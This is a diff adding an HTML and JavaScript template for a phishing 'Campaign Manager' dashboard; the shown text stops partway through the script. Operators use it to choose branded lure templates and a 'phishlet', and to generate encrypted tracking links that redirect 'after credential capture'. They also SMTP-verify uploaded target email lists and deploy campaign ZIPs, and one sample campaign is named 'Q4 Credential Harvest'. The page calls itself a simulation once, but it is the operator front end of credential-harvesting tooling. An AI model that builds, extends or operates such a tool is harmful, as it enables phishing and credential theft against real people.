@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>{{if .Selected}}{{.Selected.Name}} — {{end}}Campaign Manager</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap');
+
+:root {
+  --bg: #090c10;
+  --surface: #11161e;
+  --border: #1e2530;
+  --text: #b0b8c0;
+  --text-bright: #e8ecf1;
+  --blue: #4199f5;
+  --green: #26a641;
+  --purple: #8b6ff0;
+  --amber: #e8953b;
+  --red: #f5534b;
+  --font-sans: 'IBM Plex Sans', -apple-system, sans-serif;
+  --font-mono: 'JetBrains Mono', 'SF Mono', monospace;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  font-family: var(--font-sans);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow: hidden;
+}
+
+/* ── Layout ── */
+.layout { display: flex; height: 100vh; }
+
+/* ── Sidebar ── */
+.sidebar {
+  width: 300px; min-width: 300px;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  display: flex; flex-direction: column;
+  overflow: hidden;
+}
+.sidebar-header {
+  padding: 20px 20px 16px;
+  font-size: 18px; font-weight: 600; color: var(--text-bright);
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+.campaign-list {
+  flex: 1; overflow-y: auto;
+  padding: 8px 0;
+}
+.campaign-item {
+  display: block; padding: 12px 20px;
+  text-decoration: none; color: var(--text);
+  border-left: 3px solid transparent;
+  transition: background 0.12s, border-color 0.12s;
+}
+.campaign-item:hover { background: rgba(255,255,255,0.03); }
+.campaign-item.active {
+  background: rgba(65,153,245,0.08);
+  border-left-color: var(--blue);
+}
+.campaign-item-name {
+  font-size: 14px; font-weight: 500; color: var(--text-bright);
+  margin-bottom: 4px;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+}
+.campaign-item.active .campaign-item-name { color: var(--blue); }
+.campaign-item-meta {
+  display: flex; align-items: center; gap: 8px;
+  font-size: 12px;
+}
+.campaign-item-lure {
+  font-family: var(--font-mono); font-size: 11px;
+  color: var(--text); opacity: 0.7;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  max-width: 130px;
+}
+.campaign-item .badge { flex-shrink: 0; }
+
+.sidebar-footer {
+  padding: 12px 16px; border-top: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+/* ── Main panel ── */
+.main-panel {
+  flex: 1; overflow-y: auto; padding: 32px 40px;
+}
+
+/* ── Buttons ── */
+.btn {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 8px 18px; border-radius: 6px; font-size: 14px; font-weight: 500;
+  text-decoration: none; cursor: pointer; border: none;
+  font-family: var(--font-sans); transition: opacity 0.15s;
+}
+.btn:hover { opacity: 0.85; }
+.btn:disabled { opacity: 0.4; cursor: not-allowed; }
+.btn-primary { background: var(--blue); color: #fff; }
+.btn-success { background: var(--green); color: #fff; }
+.btn-ghost  { background: transparent; color: var(--text); border: 1px solid var(--border); }
+.btn-block { width: 100%; justify-content: center; }
+.btn-sm { padding: 5px 14px; font-size: 12px; border-radius: 4px; }
+
+/* ── Status badges ── */
+.badge {
+  display: inline-block; padding: 2px 10px; border-radius: 12px;
+  font-size: 11px; font-weight: 600; line-height: 1.6;
+}
+.badge-draft    { background: rgba(161,170,179,0.15); color: var(--text); }
+.badge-active   { background: rgba(65,153,245,0.15);  color: var(--blue); }
+.badge-verified { background: rgba(139,111,240,0.15); color: var(--purple); }
+.badge-deployed { background: rgba(38,166,65,0.15);  color: var(--green); }
+
+/* ── Step indicator ── */
+.step-bar {
+  display: flex; margin-bottom: 32px;
+}
+.step-dot {
+  flex: 1; display: flex; align-items: center; gap: 8px;
+  padding: 10px 12px; font-size: 12px; font-weight: 500;
+  color: var(--text); position: relative;
+  background: var(--surface); border: 1px solid var(--border);
+}
+.step-dot:first-child { border-radius: 6px 0 0 6px; }
+.step-dot:last-child  { border-radius: 0 6px 6px 0; }
+.step-dot:not(:first-child) { border-left: none; }
+.step-dot .step-num {
+  width: 22px; height: 22px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-weight: 600; flex-shrink: 0;
+  background: var(--border); color: var(--text);
+}
+.step-dot.done { color: var(--green); border-color: rgba(38,166,65,0.3); }
+.step-dot.done .step-num { background: var(--green); color: #fff; }
+.step-dot.current { color: var(--blue); border-color: rgba(65,153,245,0.3); font-weight: 600; }
+.step-dot.current .step-num { background: var(--blue); color: #fff; }
+
+/* ── Panels & Cards ── */
+.panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 24px;
+  margin-bottom: 16px;
+}
+.panel-header {
+  display: flex; align-items: center; gap: 10px;
+  margin-bottom: 16px;
+}
+.panel-header h2 {
+  font-size: 16px; font-weight: 600; color: var(--text-bright);
+}
+.panel-desc { font-size: 13px; color: var(--text); margin-bottom: 18px; line-height: 1.5; }
+
+.welcome-panel {
+  text-align: center; padding: 64px 32px;
+}
+.welcome-panel h1 {
+  font-size: 22px; font-weight: 600; color: var(--text-bright); margin-bottom: 8px;
+}
+.welcome-panel p {
+  font-size: 14px; color: var(--text); margin-bottom: 24px;
+}
+
+/* ── Lure card grid ── */
+.lure-grid {
+  display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+  gap: 12px; margin-bottom: 24px;
+}
+.lure-card {
+  background: var(--bg);
+  border: 2px solid var(--border);
+  border-radius: 8px;
+  padding: 16px 12px 12px;
+  cursor: pointer;
+  text-align: center;
+  transition: border-color 0.15s, background 0.15s;
+}
+.lure-card:hover { border-color: var(--text); }
+.lure-card.selected { border-color: var(--blue); background: rgba(65,153,245,0.06); }
+.lure-card-icon {
+  width: 40px; height: 40px; border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 8px;
+  font-size: 18px; font-weight: 700; color: #fff;
+}
+.lure-card-name {
+  font-size: 13px; font-weight: 500; color: var(--text-bright);
+  margin-bottom: 6px; line-height: 1.3;
+}
+.lure-card-cat {
+  font-size: 10px; font-weight: 500; text-transform: uppercase;
+  letter-spacing: 0.5px; padding: 2px 8px; border-radius: 4px;
+  display: inline-block;
+}
+
+/* Icon colors by category */
+.icon-document  { background: var(--blue); }
+.icon-file-share { background: var(--purple); }
+.icon-payment   { background: var(--amber); }
+.icon-voip      { background: var(--green); }
+.icon-other     { background: var(--text); }
+
+.cat-document  { background: rgba(65,153,245,0.15); color: var(--blue); }
+.cat-file-share { background: rgba(139,111,240,0.15); color: var(--purple); }
+.cat-payment   { background: rgba(232,149,59,0.15); color: var(--amber); }
+.cat-voip      { background: rgba(38,166,65,0.15); color: var(--green); }
+.cat-other     { background: rgba(161,170,179,0.12); color: var(--text); }
+
+/* ── Forms ── */
+.form-group { margin-bottom: 16px; }
+.form-group:last-of-type { margin-bottom: 18px; }
+label {
+  display: block; font-size: 13px; font-weight: 500;
+  color: var(--text-bright); margin-bottom: 6px;
+}
+input[type="text"], input[type="file"], select {
+  width: 100%; padding: 10px 12px; border-radius: 6px;
+  background: var(--bg); border: 1px solid var(--border);
+  color: var(--text-bright); font-size: 14px; font-family: var(--font-sans);
+  outline: none; transition: border-color 0.15s;
+}
+input:focus, select:focus { border-color: var(--blue); }
+select option { background: var(--surface); color: var(--text-bright); }
+input[type="file"] { padding: 8px; }
+input[type="file"]::file-selector-button {
+  background: var(--border); border: none; color: var(--text-bright);
+  padding: 4px 12px; border-radius: 4px; margin-right: 10px;
+  font-family: var(--font-sans); cursor: pointer;
+}
+.form-actions { display: flex; gap: 10px; align-items: center; }
+.form-hint { font-size: 12px; color: var(--text); margin-top: 6px; }
+
+/* ── Link result ── */
+.link-result {
+  margin-top: 16px; padding: 14px 16px;
+  background: var(--bg); border: 1px solid var(--border);
+  border-radius: 6px;
+}
+.link-result-label {
+  font-size: 11px; font-weight: 500; text-transform: uppercase;
+  letter-spacing: 0.5px; color: var(--text); margin-bottom: 8px;
+}
+.link-result-value {
+  font-family: var(--font-mono); font-size: 13px; color: var(--blue);
+  word-break: break-all; margin-bottom: 10px;
+  line-height: 1.5;
+}
+.link-result-actions { display: flex; gap: 8px; }
+
+/* ── Verify result ── */
+.verify-result {
+  margin-top: 16px; padding: 14px 16px;
+  background: var(--bg); border: 1px solid var(--border);
+  border-radius: 6px;
+}
+.verify-stats {
+  display: grid; grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
+  gap: 12px; margin-top: 10px;
+}
+.verify-stat {
+  text-align: center; padding: 10px;
+  background: var(--surface); border-radius: 6px;
+}
+.verify-stat-value {
+  font-size: 22px; font-weight: 700; color: var(--text-bright);
+}
+.verify-stat-label {
+  font-size: 11px; color: var(--text); margin-top: 2px;
+}
+
+/* ── Read-only lure display ── */
+.selected-lure {
+  display: inline-flex; align-items: center; gap: 10px;
+  padding: 10px 16px; background: var(--bg);
+  border: 1px solid var(--border); border-radius: 8px;
+}
+.selected-lure .lure-card-icon { margin: 0; }
+
+/* ── Empty state ── */
+.empty-state {
+  text-align: center; padding: 48px 0; color: var(--text);
+}
+.empty-state p { margin-bottom: 4px; }
+
+/* ── Misc ── */
+.mono { font-family: var(--font-mono); }
+.text-green  { color: var(--green); }
+.text-blue   { color: var(--blue); }
+.text-purple { color: var(--purple); }
+.text-amber  { color: var(--amber); }
+.mt-12 { margin-top: 12px; }
+.mt-16 { margin-top: 16px; }
+.hidden { display: none; }
+
+/* ── Skip link ── */
+.skip-link {
+  position: absolute; top: -100%; left: 0;
+  padding: 10px 20px; background: var(--blue); color: #fff;
+  font-weight: 600; font-size: 14px; text-decoration: none;
+  z-index: 1000; border-radius: 0 0 6px 0;
+}
+.skip-link:focus { top: 0; }
+
+/* ── Focus rings ── */
+:focus-visible { outline: 2px solid var(--blue); outline-offset: 2px; }
+
+/* ── Touch targets ── */
+.btn, .lure-card, [role="button"], .campaign-item { min-height: 44px; min-width: 44px; }
+
+/* ── Reduced motion ── */
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: 0.01ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: 0.01ms !important;
+  }
+}
+
+/* ── Deploy summary card ── */
+.deploy-summary {
+  margin-bottom: 20px;
+}
+.deploy-summary-header {
+  font-size: 15px; font-weight: 600; color: var(--text-bright);
+  margin-bottom: 14px; padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+}
+.deploy-summary-row {
+  display: grid; grid-template-columns: 90px 1fr;
+  gap: 12px; padding: 5px 0; align-items: baseline;
+}
+.deploy-summary-label {
+  font-size: 12px; font-weight: 500; color: var(--text);
+  text-transform: uppercase; letter-spacing: 0.4px;
+}
+.deploy-summary-value {
+  font-size: 14px; color: var(--text-bright);
+}
+.deploy-summary-link {
+  font-size: 13px; overflow: hidden; text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+/* Scrollbar styling */
+.campaign-list::-webkit-scrollbar { width: 5px; }
+.campaign-list::-webkit-scrollbar-track { background: transparent; }
+.campaign-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.main-panel::-webkit-scrollbar { width: 5px; }
+.main-panel::-webkit-scrollbar-track { background: transparent; }
+.main-panel::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+/* ── Spinner ── */
+.spinner {
+  display: inline-block; width: 16px; height: 16px;
+  border: 2px solid rgba(255,255,255,0.25);
+  border-top-color: #fff; border-radius: 50%;
+  animation: spin 0.6s linear infinite;
+  vertical-align: middle; margin-right: 4px; flex-shrink: 0;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ── Toast ── */
+.toast-container {
+  position: fixed; top: 16px; right: 16px;
+  z-index: 9999; display: flex; flex-direction: column;
+  gap: 8px; max-width: 380px; pointer-events: none;
+}
+.toast {
+  padding: 12px 16px; border-radius: 8px;
+  font-size: 13px; font-weight: 500; line-height: 1.4;
+  color: #fff; pointer-events: auto;
+  animation: toast-in 0.3s ease-out;
+  display: flex; align-items: flex-start; gap: 8px;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+}
+.toast-out { opacity: 0; transform: translateX(100%); transition: all 0.3s ease-in; }
+.toast-success { background: #1a6b30; }
+.toast-error   { background: #9b1c1c; }
+.toast-icon { flex-shrink: 0; font-size: 15px; line-height: 1.3; }
+@keyframes toast-in {
+  from { opacity: 0; transform: translateX(100%); }
+  to   { opacity: 1; transform: translateX(0); }
+}
+
+/* ── Progress bar ── */
+.progress-bar {
+  height: 4px; background: var(--border); border-radius: 2px; overflow: hidden;
+}
+.progress-bar::after {
+  content: ''; display: block; width: 40%; height: 100%;
+  background: var(--blue); border-radius: 2px;
+  animation: progress-indeterminate 1.2s ease-in-out infinite;
+}
+@keyframes progress-indeterminate {
+  0%   { transform: translateX(-100%); }
+  100% { transform: translateX(350%); }
+}
+
+/* ── Field validation ── */
+.field-error   { display: block; margin-top: 4px; font-size: 12px; color: var(--red); }
+.field-warning { display: block; margin-top: 4px; font-size: 12px; color: var(--amber); }
+
+/* ── Empty state icon ── */
+.empty-state-icon {
+  font-size: 40px; margin-bottom: 12px; opacity: 0.25;
+  line-height: 1;
+}
+</style>
+</head>
+<body>
+<div id="toast-container" class="toast-container"></div>
+<a href="#main-content" class="skip-link">Skip to main content</a>
+<div class="layout">
+  <!-- ═══ SIDEBAR ═══ -->
+  <nav class="sidebar" aria-label="Campaign list">
+    <header role="banner" class="sidebar-header">Campaign Manager</header>
+    <div class="campaign-list">
+      {{if .Campaigns}}
+      {{range .Campaigns}}
+      {{$isActive := false}}
+      {{if $.Selected}}{{if eq $.Selected.ID .ID}}{{$isActive = true}}{{end}}{{end}}
+      <a href="/campaigns/{{.ID}}" class="campaign-item{{if $isActive}} active{{end}}">
+        <div class="campaign-item-name">{{.Name}}</div>
+        <div class="campaign-item-meta">
+          {{$brand := ""}}
+          {{$monoFile := .Lure}}
+          {{range $.Lures}}
+          {{if eq .Filename $monoFile}}
+          {{$brand = .Brand}}
+          {{end}}
+          {{end}}
+          <span class="campaign-item-lure">{{if $brand}}{{$brand}}{{else}}{{.Lure}}{{end}}</span>
+          <span class="badge badge-{{.Status}}" role="status">{{.Status}}</span>
+        </div>
+      </a>
+      {{end}}
+      {{else}}
+      <div class="empty-state">
+        <div class="empty-state-icon">&#9872;</div>
+        <p style="color:var(--text-bright);font-weight:500;">No campaigns yet.</p>
+        <p style="font-size:13px;">Create your first simulation.</p>
+      </div>
+      {{end}}
+    </div>
+    <div class="sidebar-footer">
+      <a href="/" class="btn btn-primary btn-block">+ New Campaign</a>
+    </div>
+  </nav>
+
+  <!-- ═══ MAIN PANEL ═══ -->
+  <main role="main" id="main-content" class="main-panel">
+    {{if .Selected}}
+      <!-- ══════════ CAMPAIGN WORKFLOW ══════════ -->
+      <div class="panel-header" style="margin-bottom:24px;">
+        <h2 style="font-size:20px;">{{.Selected.Name}}</h2>
+        <span class="badge badge-{{.Selected.Status}}" role="status">{{.Selected.Status}}</span>
+      </div>
+
+      <!-- Step indicator -->
+      <div class="step-bar">
+        <div class="step-dot done">
+          <span class="step-num">1</span> Select Lure
+        </div>
+        <div class="step-dot{{if eq .Selected.Status "draft"}} current{{else}} done{{end}}">
+          <span class="step-num">2</span> Generate Link
+        </div>
+        <div class="step-dot{{if eq .Selected.Status "active"}} current{{end}}{{if or (eq .Selected.Status "verified") (eq .Selected.Status "deployed")}} done{{end}}">
+          <span class="step-num">3</span> Verify Leads
+        </div>
+        <div class="step-dot{{if eq .Selected.Status "verified"}} current{{end}}{{if eq .Selected.Status "deployed"}} done{{end}}">
+          <span class="step-num">4</span> Preview
+        </div>
+        <div class="step-dot{{if eq .Selected.Status "deployed"}} done current{{end}}">
+          <span class="step-num">5</span> Deploy
+        </div>
+      </div>
+
+      {{/* ── Step 1: Select Lure (done, read-only) ── */}}
+      {{$selectedLure := index $.Lures 0}}
+      {{$found := false}}
+      {{range $.Lures}}
+      {{if eq .Filename $.Selected.Lure}}
+      {{$selectedLure = .}}
+      {{$found = true}}
+      {{end}}
+      {{end}}
+      <div class="panel">
+        <div class="panel-header">
+          <span class="step-num" style="background:var(--green);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">&#10003;</span>
+          <h2>Step 1: Select Lure</h2>
+        </div>
+        <div class="selected-lure">
+          <div class="lure-card-icon icon-{{$selectedLure.Category}}">{{$selectedLure.Icon}}</div>
+          <div>
+            <div style="font-weight:500;color:var(--text-bright);">{{$selectedLure.Brand}}</div>
+            <div style="font-size:12px;font-family:var(--font-mono);color:var(--text);">{{$selectedLure.Filename}}</div>
+          </div>
+          <span class="lure-card-cat cat-{{$selectedLure.Category}}" style="margin-left:auto;">{{$selectedLure.Category}}</span>
+        </div>
+      </div>
+
+      {{/* ── Step 2: Generate Link ── */}}
+      <div class="panel">
+        <div class="panel-header">
+          {{if eq .Selected.Status "draft"}}
+          <span class="step-num" style="background:var(--blue);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">2</span>
+          <h2>Step 2: Generate Link</h2>
+          {{else}}
+          <span class="step-num" style="background:var(--green);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">&#10003;</span>
+          <h2>Step 2: Generate Link</h2>
+          {{end}}
+        </div>
+
+        {{if eq .Selected.Status "draft"}}
+        <p class="panel-desc">Encrypt and encode a tracking link for this campaign. You will need the AES-256 key (32 bytes, base64-encoded).</p>
+        <form id="link-form" data-campaign="{{.Selected.ID}}">
+          <div class="form-group">
+            <label for="redirect">Redirect URL (after credential capture)</label>
+            <input type="text" id="redirect" name="redirect" required
+                   placeholder="https://example.com/login">
+            <span class="field-error" id="err-redirect"></span>
+          </div>
+          <div class="form-group">
+            <label for="key">AES-256 Key (base64-encoded, 32 bytes)</label>
+            <input type="text" id="key" name="key" required
+                   placeholder="base64-encoded 32-byte key">
+            <span class="field-error" id="err-key"></span>
+          </div>
+          <button type="submit" class="btn btn-primary">Generate Link</button>
+        </form>
+        <div id="link-result" class="hidden link-result mt-16"></div>
+        {{else if .Selected.Link}}
+        <div class="link-result">
+          <div class="link-result-label">Generated Link</div>
+          <div class="link-result-value" id="existing-link">{{.Selected.Link}}</div>
+          <div class="link-result-actions">
+            <button class="btn btn-sm btn-primary copy-btn" data-target="existing-link">Copy</button>
+          </div>
+        </div>
+        {{else}}
+        <p class="panel-desc" style="color:var(--text);">Use the form below — it was available when the campaign was in draft status.</p>
+        <form id="link-form" data-campaign="{{.Selected.ID}}">
+          <div class="form-group">
+            <label for="redirect">Redirect URL (after credential capture)</label>
+            <input type="text" id="redirect" name="redirect" required
+                   placeholder="https://example.com/login">
+            <span class="field-error" id="err-redirect"></span>
+          </div>
+          <div class="form-group">
+            <label for="key">AES-256 Key (base64-encoded, 32 bytes)</label>
+            <input type="text" id="key" name="key" required
+                   placeholder="base64-encoded 32-byte key">
+            <span class="field-error" id="err-key"></span>
+          </div>
+          <button type="submit" class="btn btn-primary">Generate Link</button>
+        </form>
+        <div id="link-result" class="hidden link-result mt-16"></div>
+        {{end}}
+      </div>
+
+      {{/* ── Step 3: Verify Leads ── */}}
+      <div class="panel">
+        <div class="panel-header">
+          {{if eq .Selected.Status "active"}}
+          <span class="step-num" style="background:var(--blue);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">3</span>
+          <h2>Step 3: Verify Leads</h2>
+          {{else if or (eq .Selected.Status "verified") (eq .Selected.Status "deployed")}}
+          <span class="step-num" style="background:var(--green);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">&#10003;</span>
+          <h2>Step 3: Verify Leads</h2>
+          {{if .Selected.LeadCount}}<span style="font-size:13px;color:var(--text);">({{.Selected.LeadCount}} leads)</span>{{end}}
+          {{else}}
+          <span class="step-num" style="background:var(--border);color:var(--text);width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">3</span>
+          <h2>Step 3: Verify Leads</h2>
+          {{end}}
+        </div>
+
+        {{if eq .Selected.Status "active"}}
+        <p class="panel-desc">Upload a CSV file of target emails or identifiers. Use Quick Count for a fast count, or Deep Verify for SMTP validation.</p>
+        <div id="upload-progress" class="hidden mt-16" style="margin-bottom:12px;">
+          <p style="font-size:13px;color:var(--text);margin-bottom:8px;" id="upload-progress-text">Uploading leads.csv...</p>
+          <div class="progress-bar"></div>
+        </div>
+        <form id="verify-form" data-campaign="{{.Selected.ID}}" enctype="multipart/form-data">
+          <div class="form-group">
+            <label for="leads">Leads CSV File</label>
+            <input type="file" id="leads" name="leads" accept=".csv" required>
+          </div>
+          <div class="form-actions">
+            <button type="submit" name="mode" value="count" class="btn btn-primary">Quick Count</button>
+            <button type="submit" name="mode" value="smtp" class="btn btn-ghost">Deep Verify (SMTP)</button>
+          </div>
+        </form>
+        <div id="verify-result" class="hidden verify-result mt-16"></div>
+        {{else if or (eq .Selected.Status "verified") (eq .Selected.Status "deployed")}}
+        <p class="panel-desc">Leads have been verified. {{if .Selected.LeadCount}}<strong>{{.Selected.LeadCount}}</strong> targets ready.{{end}}</p>
+        <div id="verify-result" class="verify-result" style="margin-top:0;">
+          <div class="verify-stats">
+            <div class="verify-stat">
+              <div class="verify-stat-value">{{.Selected.LeadCount}}</div>
+              <div class="verify-stat-label">Total Leads</div>
+            </div>
+          </div>
+        </div>
+        {{else}}
+        <p class="panel-desc">Generate a link first (Step 2) before verifying leads.</p>
+        {{end}}
+      </div>
+
+      {{/* ── Step 4: Preview ── */}}
+      <div class="panel">
+        <div class="panel-header">
+          {{if eq .Selected.Status "verified"}}
+          <span class="step-num" style="background:var(--blue);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">4</span>
+          <h2>Step 4: Preview Lure</h2>
+          {{else if eq .Selected.Status "deployed"}}
+          <span class="step-num" style="background:var(--green);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">&#10003;</span>
+          <h2>Step 4: Preview Lure</h2>
+          {{else}}
+          <span class="step-num" style="background:var(--border);color:var(--text);width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">4</span>
+          <h2>Step 4: Preview Lure</h2>
+          {{end}}
+        </div>
+
+        {{if or (eq .Selected.Status "verified") (eq .Selected.Status "deployed")}}
+        <p class="panel-desc">Review the filled lure template with your tracking link injected.</p>
+        <a href="/api/campaigns/{{.Selected.ID}}/preview" target="_blank" class="btn btn-primary">Open Preview in New Tab</a>
+        {{else}}
+        <p class="panel-desc">Verify leads first (Step 3) before previewing the lure.</p>
+        {{end}}
+      </div>
+
+      {{/* ── Step 5: Deploy ── */}}
+      <div class="panel">
+        <div class="panel-header">
+          {{if eq .Selected.Status "deployed"}}
+          <span class="step-num" style="background:var(--green);color:#fff;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">&#10003;</span>
+          <h2>Step 5: Deploy</h2>
+          {{else}}
+          <span class="step-num" style="background:var(--border);color:var(--text);width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;">5</span>
+          <h2>Step 5: Deploy</h2>
+          {{end}}
+        </div>
+
+        {{if eq .Selected.Status "deployed"}}
+        <p class="panel-desc">Campaign is live. All steps complete.</p>
+        <form method="POST" action="/api/campaigns/{{.Selected.ID}}/deploy">
+          <button type="submit" class="btn btn-success">Download ZIP Again</button>
+        </form>
+        {{else if eq .Selected.Status "verified"}}
+        <p class="panel-desc">Review the summary below, then deploy to generate the campaign ZIP.</p>
+        <div class="deploy-summary">
+          <div class="deploy-summary-header">Ready to Deploy</div>
+          <div class="deploy-summary-row">
+            <span class="deploy-summary-label">Lure</span>
+            <span class="deploy-summary-value">{{$selectedLure.Brand}} <span class="mono" style="font-size:12px;color:var(--text);">({{.Selected.Lure}})</span></span>
+          </div>
+          <div class="deploy-summary-row">
+            <span class="deploy-summary-label">Link</span>
+            <span class="deploy-summary-value mono deploy-summary-link"{{if not .Selected.Link}} style="color:var(--text);"{{end}}>{{if .Selected.Link}}{{.Selected.Link}}{{else}}&mdash;{{end}}</span>
+          </div>
+          <div class="deploy-summary-row">
+            <span class="deploy-summary-label">Targets</span>
+            <span class="deploy-summary-value">{{if .Selected.LeadCount}}{{.Selected.LeadCount}} verified{{else}}0{{end}}</span>
+          </div>
+          <div class="deploy-summary-row">
+            <span class="deploy-summary-label">Created</span>
+            <span class="deploy-summary-value mono" style="font-size:12px;">{{.Selected.CreatedAt}}</span>
+          </div>
+        </div>
+        {{if .Selected.Link}}
+        <form method="POST" action="/api/campaigns/{{.Selected.ID}}/deploy">
+          <button type="submit" class="btn btn-success">Download ZIP &amp; Deploy</button>
+        </form>
+        {{end}}
+        {{else}}
+        <p class="panel-desc">Complete the previous steps before deploying.</p>
+        {{end}}
+      </div>
+
+    {{else}}
+      <!-- ══════════ NEW CAMPAIGN FORM ══════════ -->
+      <div class="panel-header" style="margin-bottom:24px;">
+        <h2 style="font-size:20px;">New Campaign</h2>
+      </div>
+
+      <form method="POST" action="/api/campaigns" id="new-campaign-form">
+        <div class="panel">
+          <div class="form-group">
+            <label for="name">Campaign Name</label>
+            <input type="text" id="name" name="name" required
+                   placeholder="e.g. Q4 Credential Harvest" autofocus>
+          </div>
+        </div>
+
+        <div class="panel">
+          <h2 style="font-size:16px;font-weight:600;color:var(--text-bright);margin-bottom:4px;">Step 1: Select a Lure</h2>
+          <p class="panel-desc">Choose the phishing lure template for this campaign.</p>
+          <div class="lure-grid" id="lure-grid">
+            {{range .Lures}}
+            <div class="lure-card" data-filename="{{.Filename}}" data-brand="{{.Brand}}" data-icon="{{.Icon}}" data-category="{{.Category}}">
+              <div class="lure-card-icon icon-{{.Category}}">{{.Icon}}</div>
+              <div class="lure-card-name">{{.Brand}}</div>
+              <span class="lure-card-cat cat-{{.Category}}">{{.Category}}</span>
+            </div>
+            {{end}}
+          </div>
+          <input type="hidden" name="lure" id="lure-input" required aria-describedby="lure-hint">
+          <div class="form-hint" id="lure-hint" style="color:var(--red);">Select a lure template above</div>
+        </div>
+
+        <div class="panel">
+          <div class="form-group">
+            <label for="phishlet">Phishlet</label>
+            <select id="phishlet" name="phishlet" required>
+              <option value="">— Select a phishlet —</option>
+              {{range .Phishlets}}
+              <option value="{{.Name}}">{{.Label}}</option>
+              {{end}}
+            </select>
+          </div>
+          <div class="form-actions">
+            <button type="submit" class="btn btn-primary">Create Campaign</button>
+          </div>
+        </div>
+      </form>
+    {{end}}
+  </main>
+</div>
+
+<script>
+(function(){
+  'use strict';
+
+  // ═══ Helpers ═══
+  function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  // ═══ Toast system ═══
+  function showToast(message, type) {
+    var container = document.getElementById('toast-container');
+    if (!container) return;
+    var toast = document.createElement('div');
+    toast.className = 'toast toast-' + type;
+    toast.innerHTML = '<span class="toast-icon">' + (type === 'success' ? '✓' : '✗') + '</span>' + escHtml(message);
+    container.appendChild(toast);
+    var dur = type === 'success' ? 4000 : 6000;
+    setTimeout(function(){
+      toast.classList.add('toast-out');
+      setTimeout(function(){
+        if (toast.parentNode) toast.parentNode.removeChild(toast);
+      }, 300);
+    }, dur);
+  }
+
+  // ═══ Button loading helper ═══
+  function setBtnLoading(btn, loading) {
+    if (loading) {
+      btn.disabled = true;
+      btn.setAttribute('data-orig', btn.innerHTML);
+      btn.innerHTML = '<span class="spinner"></span>Processing...';
+    } else {
+      btn.disabled = false;
+      var orig = btn.getAttribute('data-orig');
+      if (orig) btn.innerHTML = orig;
+    }
+  }
+
+  // ═══ Lure card selection ═══
+  var lureCards = document.querySelectorAll('#lure-grid .lure-card');
+  var lureInput = document.getElementById('lure-input');
+  var lureHint = document.getElementById('lure-hint');
+
+  lureCards.forEach(function(card){
+    card.addEventListener('click', function(){
+      lureCards.forEach(function(c){ c.classList.remove('selected'); });
+      card.classList.add('selected');
+      lureInput.value = card.getAttribute('data-filename');
+      if (lureHint) { lureHint.style.display = 'none'; }
+
+      var brand = card.getAttribute('data-brand');
+      if (brand) {
+        var confirm = document.getElementById('lure-selected-name');
+        if (confirm) confirm.textContent = brand;
+      }
+    });
+  });
+
+  // ═══ Copy buttons ═══
+  function bindCopyBtn(btn) {
+    btn.addEventListener('click', function(){
+      var targetId = btn.getAttribute('data-target');
+      var el = document.getElementById(targetId);
+      if (!el) return;
+      var text = el.textContent || el.value || '';
+      navigator.clipboard.writeText(text).then(function(){
+        var orig = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(function(){ btn.textContent = orig; }, 2000);
+      }).catch(function(){
+        prompt('Copy this link:', text);
+      });
+    });
+  }
+  document.querySelectorAll('.copy-btn').forEach(bindCopyBtn);
+
+  // ═══ Inline form validation ═══
+  function validateLinkForm(form) {
+    var valid = true;
+    var redirect = form.querySelector('#redirect');
+    var key = form.querySelector('#key');
+    var errRedir = form.querySelector('#err-redirect');
+    var errKey = form.querySelector('#err-key');
+
+    if (errRedir) errRedir.textContent = '';
+    if (errKey) { errKey.textContent = ''; errKey.className = 'field-error'; }
+
+    if (redirect && !redirect.value.trim()) {
